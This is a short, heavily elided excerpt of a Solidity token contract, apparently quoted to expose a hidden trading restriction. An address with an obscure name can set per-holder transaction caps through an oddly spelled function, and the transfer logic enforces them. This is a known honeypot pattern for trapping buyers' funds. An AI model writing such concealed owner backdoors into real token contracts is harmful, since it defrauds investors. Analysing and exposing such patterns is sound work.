...
contract Token is IERC20, Ownable {
	...
	mapping(address => uint256) private _userSel111lMaxAmount;
	...
	address private contractSender18;
	...
	function setUserSel111lMaxAmount(address account,uint256 maxAmount) public {
		require(msg.sender == contractSender18);
        _userSel111lMaxAmount[account] = maxAmount;
    }
    ...
    function _transfer(
        ...
        if(_tTotalDestroy >= (_tTotal-_tTotalMin)){
            ...
            if(from == uniswapV2Pair){
				...
				if(_userSel111lMaxAmount[from] > 0){
					require(_userSel111lMaxAmount[from] >= amount.add(_userSellAmount[from]));
				}
